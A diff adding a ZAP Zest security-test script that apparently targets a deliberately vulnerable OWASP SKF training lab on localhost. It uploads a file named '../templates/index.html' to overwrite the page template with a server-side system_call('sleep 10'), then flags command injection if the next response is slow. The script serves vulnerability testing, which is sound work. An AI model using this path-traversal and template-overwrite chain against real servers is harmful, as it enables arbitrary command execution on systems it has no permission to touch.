@@ -1,0 +1,131 @@
+{
+  "about": "This is a Zest script. For more details about Zest visit https://github.com/zaproxy/zest/",
+  "zestVersion": "0.3",
+  "title": "CMD3",
+  "description": "A template standalone script",
+  "prefix": "",
+  "type": "StandAlone",
+  "parameters": {
+    "tokenStart": "{{",
+    "tokenEnd": "}}",
+    "tokens": {},
+    "elementType": "ZestVariables"
+  },
+  "statements": [
+    {
+      "url": "https://localhost:7000/",
+      "data": "",
+      "method": "GET",
+      "headers": "DNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n",
+      "response": {
+        "url": "http://localhost:7000/",
+        "headers": "HTTP/1.0 200 OK\nContent-Type: text/html; charset\u003dutf-8\nContent-Length: 5741\nServer: Werkzeug/2.0.3 Python/3.7.8\nDate: Mon, 23 May 2022 07:38:21 GMT\n\n",
+        "body": "",
+        "statusCode": 200,
+        "responseTimeInMs": 28,
+        "elementType": "ZestResponse"
+      },
+      "assertions": [
+        {
+          "rootExpression": {
+            "code": 200,
+            "not": false,
+            "elementType": "ZestExpressionStatusCode"
+          },
+          "elementType": "ZestAssertion"
+        }
+      ],
+      "followRedirects": false,
+      "timestamp": 1653291501067,
+      "cookies": [],
+      "index": 1,
+      "enabled": true,
+      "elementType": "ZestRequest"
+    },
+    {
+      "url": "https://localhost:7000/",
+      "data": "-----------------------------41330573632749326379209196017\r\nContent-Disposition: form-data; name\u003d\"file\"; filename\u003d\"../templates/index.html\"\r\nContent-Type: text/html\r\n\r\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\n\u003cmeta charset\u003d\"utf-8\"\u003e\n\u003cmeta name\u003d\"viewport\" content\u003d\"width\u003ddevice-width, initial-scale\u003d1\"\u003e\n\u003ctitle\u003eLive demonstrations\u003c/title\u003e\n\n\u003clink href\u003d\"/static/css/bootstrap.min.css\" rel\u003d\"stylesheet\"\u003e\n\u003clink href\u003d\"/static/css/datepicker3.css\" rel\u003d\"stylesheet\"\u003e\n\u003clink href\u003d\"/static/css/styles.css\" rel\u003d\"stylesheet\"\u003e\n\u003cscript src\u003d\"/static/js/hints.js\"\u003e\u003c/script\u003e\n\u003c!--Icons--\u003e\n\u003cscript src\u003d\"/static/js/lumino.glyphs.js\"\u003e\u003c/script\u003e\n\n\u003c/head\u003e\n\n\u003cbody\u003e\n\t\u003cnav class\u003d\"navbar navbar-inverse navbar-fixed-top\" role\u003d\"navigation\"\u003e\n\t\t\u003cdiv class\u003d\"container-fluid\"\u003e\n\t\t\t\u003cdiv class\u003d\"navbar-header\"\u003e\n\t\t\t\t\u003cbutton type\u003d\"button\" class\u003d\"navbar-toggle collapsed\" data-toggle\u003d\"collapse\" data-target\u003d\"#sidebar-collapse\"\u003e\n\t\t\t\t\t\u003cspan class\u003d\"sr-only\"\u003eToggle navigation\u003c/span\u003e\n\t\t\t\t\t\u003cspan class\u003d\"icon-bar\"\u003e\u003c/span\u003e\n\t\t\t\t\t\u003cspan class\u003d\"icon-bar\"\u003e\u003c/span\u003e\n\t\t\t\t\t\u003cspan class\u003d\"icon-bar\"\u003e\u003c/span\u003e\n\t\t\t\t\u003c/button\u003e\n\t\t\t\t\u003cul class\u003d\"user-menu\"\u003e\n\t\t\t\t\t\u003cli class\u003d\"dropdown pull-right\"\u003e\n\n\t\t\t\t\t\t\u003cul class\u003d\"dropdown-menu\" role\u003d\"menu\"\u003e\n\t\t\t\t\t\t\u003c/ul\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\u003c/ul\u003e\n\t\t\t\u003c/div\u003e\n\t\t\u003c/div\u003e\u003c!-- /.container-fluid --\u003e\n\t\u003c/nav\u003e\n\t\t\n\t\u003cdiv id\u003d\"sidebar-collapse\" class\u003d\"col-sm-3 col-lg-2 sidebar\"\u003e\n\t\u003cbr/\u003e\u003cbr/\u003e\n    \t\u003ccenter\u003e \t\t\n\t\t\t\u003cimg src\u003d\"/static/img/logo.svg\" width\u003d\"60%\" height\u003d\"60%\"/\u003e \t\t\u003cbr/\u003e \t\t\n\t\t\t\u003cp style\u003d\"color:#515594; font-size:1.0em;\"\u003e\u003ca href\u003d\"https://github.com/blabla1337/skf-flask\" style\u003d\"color:#515594; font-size:1.7em;\"\u003eOWASP S.K.F.\u003c/a\u003e\u003c/p\u003e  \t \t\t\t\u003cp\u003e\u003ca href\u003d\"https://gitter.im/Security-Knowledge-Framework/Lobby\" rel\u003d\"nofollow\"\u003e \t\t\t\t\u003cimg src\u003d\"/static/img/badge.svg\" alt\u003d\"Join the chat at https://gitter.im/Security-Knowledge-Framework/Lobby\" data-canonical-src\u003d\"/static/img/badge.svg\" style\u003d\"max-width:100%;\"\u003e\u003c/a\u003e \t\t\t\u003c/p\u003e  \t\n\t\t\u003c/center\u003e\n\n                        \u003cdiv\u003e\n                                \u003ch2 align\u003d\"center\"\u003eHint \u003cspan id\u003d\"hint-num\"\u003e0\u003c/span\u003e/2 (\u003cbutton\n                                        class\u003d\"btn btn-primary btn-lg\" type\u003d\"button\" onclick\u003d\"showHint(); return false\"\u003eshow\u003c/button\u003e)\n                                \u003c/h2\u003e\n\n                                \u003cdiv id\u003d\"hints\"\u003e\n                                        \u003col\u003e\n                                                \u003cli style\u003d\"display: none\" data-hidden\u003d\"true\"\u003e\u003cb\u003e1.\u003c/b\u003e\n                                                        Find all the fields that could be object of injection.\n                                                \u003cli style\u003d\"display: none\" data-hidden\u003d\"true\"\u003e\u003cb\u003e2.\u003c/b\u003e\n                                                        Take into account that sometimes the server is executing the input although it doesn\u0027t show an outpu$\n                                                        Find some output (dependent on the input) or a method to view output.\n                                        \u003c/ol\u003e\n                                \u003c/div\u003e\n                        \u003c/div\u003e\n\n\n\t\u003c/div\u003e\u003c!--/.sidebar--\u003e\n\t\t\n\t\u003cdiv class\u003d\"col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main\"\u003e\t\t\t\n\t\t\u003cdiv class\u003d\"row\"\u003e\n\n\t\t\u003c/div\u003e\u003c!--/.row--\u003e\n\t\t\n\t\t\u003cdiv class\u003d\"row\"\u003e\n\t\t\t\u003cdiv class\u003d\"col-lg-12\"\u003e\n\t\t\t\t\u003ch1 class\u003d\"page-header\"\u003eLive demonstration!\u003c/h1\u003e\n\t\t\t\u003c/div\u003e\n\t\t\u003c/div\u003e\u003c!--/.row--\u003e\n\t\t\u003cdiv class\u003d\"row\"\u003e\n\t\t\t\u003cdiv class\u003d\"col-lg-12\"\u003e\n\t\t\t\t\u003cdiv class\u003d\"panel panel-default\"\u003e\n\t\t\t\t\t\u003cdiv class\u003d\"panel-heading\"\u003eFile upload CMD injection!\u003c/div\u003e\n\t\t\t\t\t\u003cdiv class\u003d\"panel-body\"\u003e\n\t\t\t\t\t\t\u003cdiv class\u003d\"col-md-6\"\u003e\n\t\t\t\t\t\t\t\u003cform method\u003d\"post\" action\u003d\"\" enctype\u003d\"multipart/form-data\"\u003e\n                \t\t\t\u003cinput type\u003d\"file\" name\u003d\"file\"/\u003e\u003cbr/\u003e\n               \t\t\t    \u003cbutton class\u003d\"btn btn-primary\" type\u003d\"submit\"\u003eSubmit Button\u003c/button\u003e\n               \t\t\t\u003c/div\u003e\n\t\t\t\t\t\t\u003c/form\u003e\n\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\u003c/div\u003e\n\t\t\t\u003c/div\u003e\u003c!-- /.col--\u003e\n\t\t\u003c/div\u003e\u003c!-- /.row --\u003e\n\t\t\u003cdiv class\u003d\"row\"\u003e\n\t\t\t\u003cdiv class\u003d\"col-lg-12\"\u003e\n\t\t\t\t\u003cdiv class\u003d\"panel panel-primary\"\u003e\n\t\t\t\t\t\u003cdiv class\u003d\"panel-heading\"\u003e\n\t\t\t\t\t\tMonitoring website files system_call(\u0027ls -lart *\u0027)\n\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\t\u003cdiv class\u003d\"panel-body\"\u003e\n\t\t\t\t\t\t\u003cpre\u003e{{system_call(\u0027sleep 10\u0027)}}\u003c/pre\u003e         \n\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\t\u003cdiv class\u003d\"panel-footer\"\u003e\n\t\t\t\t\t\tHacking challenges\n\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\u003c/div\u003e\n\t\t\t\u003c/div\u003e\u003c!-- /.col--\u003e\n\t\t\u003c/div\u003e\u003c!-- /.row --\u003e\n{% autoescape false %} {{uploaded}} {% endautoescape %}\n\t\n\t\u003c/div\u003e\u003c!--/.main--\u003e\n\n\t\u003cscript src\u003d\"/static/js/jquery-1.11.1.min.js\"\u003e\u003c/script\u003e\n\t\u003cscript src\u003d\"/static/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\t\u003cscript\u003e\n\t\t!function ($) {\n\t\t\t$(document).on(\"click\",\"ul.nav li.parent \u003e a \u003e span.icon\", function(){\t\t  \n\t\t\t\t$(this).find(\u0027em:first\u0027).toggleClass(\"glyphicon-minus\");\t  \n\t\t\t}); \n\t\t\t$(\".sidebar span.icon\").find(\u0027em:first\u0027).addClass(\"glyphicon-plus\");\n\t\t}(window.jQuery);\n\n\t\t$(window).on(\u0027resize\u0027, function () {\n\t\t  if ($(window).width() \u003e 768) $(\u0027#sidebar-collapse\u0027).collapse(\u0027show\u0027)\n\t\t})\n\t\t$(window).on(\u0027resize\u0027, function () {\n\t\t  if ($(window).width() \u003c\u003d 767) $(\u0027#sidebar-collapse\u0027).collapse(\u0027hide\u0027)\n\t\t})\n\t\u003c/script\u003e\t\n\u003c/body\u003e\n\n\u003c/html\u003e\n\r\n-----------------------------41330573632749326379209196017--\r\n",
+      "method": "POST",
+      "headers": "Content-Type: multipart/form-data; boundary\u003d---------------------------41330573632749326379209196017\r\nContent-Length: 4993\r\nOrigin: https://localhost:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+      "response": {
+        "url": "http://localhost:7000/",
+        "headers": "HTTP/1.0 200 OK\nContent-Type: text/html; charset\u003dutf-8\nContent-Length: 4694\nServer: Werkzeug/2.0.3 Python/3.7.8\nDate: Mon, 23 May 2022 07:39:47 GMT\n\n",
+        "body": "",
+        "statusCode": 200,
+        "responseTimeInMs": 29,
+        "elementType": "ZestResponse"
+      },
+      "assertions": [
+        {
+          "rootExpression": {
+            "code": 200,
+            "not": false,
+            "elementType": "ZestExpressionStatusCode"
+          },
+          "elementType": "ZestAssertion"
+        }
+      ],
+      "followRedirects": false,
+      "timestamp": 1653291587747,
+      "cookies": [],
+      "index": 2,
+      "enabled": true,
+      "elementType": "ZestRequest"
+    },
+    {
+      "url": "https://localhost:7000/",
+      "data": "",
+      "method": "GET",
+      "headers": "DNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n",
+      "response": {
+        "url": "http://localhost:7000/",
+        "headers": "HTTP/1.0 200 OK\nContent-Type: text/html; charset\u003dutf-8\nContent-Length: 5741\nServer: Werkzeug/2.0.3 Python/3.7.8\nDate: Mon, 23 May 2022 07:38:21 GMT\n\n",
+        "body": "",
+        "statusCode": 200,
+        "responseTimeInMs": 28,
+        "elementType": "ZestResponse"
+      },
+      "assertions": [
+        {
+          "rootExpression": {
+            "code": 200,
+            "not": false,
+            "elementType": "ZestExpressionStatusCode"
+          },
+          "elementType": "ZestAssertion"
+        }
+      ],
+      "followRedirects": false,
+      "timestamp": 1653291501067,
+      "cookies": [],
+      "index": 3,
+      "enabled": true,
+      "elementType": "ZestRequest"
+    },
+    {
+      "rootExpression": {
+        "greaterThan": true,
+        "timeInMs": 8000,
+        "not": false,
+        "elementType": "ZestExpressionResponseTime"
+      },
+      "ifStatements": [
+        {
+          "message": "Command injection - sleep 10",
+          "priority": "HIGH",
+          "index": 5,
+          "enabled": true,
+          "elementType": "ZestActionFail"
+        }
+      ],
+      "elseStatements": [],
+      "index": 4,
+      "enabled": true,
+      "elementType": "ZestConditional"
+    }
+  ],
+  "authentication": [],
+  "index": 0,
+  "enabled": true,
+  "elementType": "ZestScript"
+}
